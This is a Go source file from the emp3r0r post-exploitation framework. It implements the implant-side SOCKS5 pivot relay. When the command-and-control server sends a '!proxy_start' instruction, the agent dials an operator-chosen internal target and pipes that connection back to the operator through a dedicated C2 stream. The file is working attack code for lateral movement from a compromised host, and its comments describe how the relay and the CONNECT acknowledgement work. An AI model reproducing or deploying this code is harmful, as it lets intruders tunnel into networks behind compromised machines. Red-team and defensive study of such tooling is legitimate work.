package handler

// cmd_proxy.go — SOCKS5 pivot relay endpoint on the agent.
//
// The C2's SOCKS5 listener (operator side) asks this agent, over the CBOR
// message tunnel, to `!proxy_start --token <token> --target <host:port>`. We
// dial the target and, on success, open a dedicated C2 stream on the Proxy
// route (no HTTP upgrade header — the instruction is carried in CBOR and the
// C2 dispatcher reroutes the stream to its proxy API). From then on the agent
// is a pure relay between the target socket and the C2 stream, and the C2 is a
// pure relay between that stream and the operator's SOCKS5 connection.
//
// Dial failure is reported as a normal command error (JobID = token) so the C2
// can answer the pending SOCKS5 CONNECT with REFUSED instead of hanging.

import (
	"io"
	"net"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/spf13/cobra"
)

const (
	// proxyTargetDialTimeout bounds the outbound dial to the requested target.
	proxyTargetDialTimeout = 20 * time.Second
	// proxyRelayShutdownGrace bounds the drain after one side of the relay closes.
	proxyRelayShutdownGrace = 5 * time.Second
)

func proxyStartCmdRun(cmd *cobra.Command, _ []string) {
	token, _ := cmd.Flags().GetString("token")
	target, _ := cmd.Flags().GetString("target")
	if token == "" || target == "" {
		c2transport.NotifyC2(cmd, "Error: !proxy_start requires --token and --target")
		return
	}
	go runProxyRelay(cmd, token, target)
}

func runProxyRelay(cmd *cobra.Command, token, target string) {
	// 1. Reach the target FIRST: the C2 answers the operator's SOCKS5 CONNECT
	// only when it sees our relay stream, so stream arrival doubles as the
	// CONNECT acknowledgement.
	targetConn, err := net.DialTimeout("tcp", target, proxyTargetDialTimeout)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: %v", err)
		return
	}
	defer targetConn.Close()

	// 2. Open the dedicated C2 relay stream on the Proxy route. token ties this
	// stream back to the operator-side SOCKS5 connection on the C2.
	stream, _, cancel, err := c2transport.EstablishC2Connection(def.CCAddress, token, common.RuntimeConfig.C2Routes.Proxy)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: open proxy relay stream: %v", err)
		return
	}
	defer cancel()
	logging.Debugf("proxy relay %s -> %s established", token, target)

	// 3. Pure relay: block until one leg finishes, then close both so the other
	// unblocks, and drain briefly so buffered data is not dropped.
	replayDone := make(chan struct{}, 2)
	go func() { _, _ = io.Copy(stream, targetConn); replayDone <- struct{}{} }() // target -> C2
	go func() { _, _ = io.Copy(targetConn, stream); replayDone <- struct{}{} }() // C2 -> target

	<-replayDone
	_ = stream.Close()
	_ = targetConn.Close()
	select {
	case <-replayDone:
	case <-time.After(proxyRelayShutdownGrace):
	}
	logging.Debugf("proxy relay %s closed", token)
}
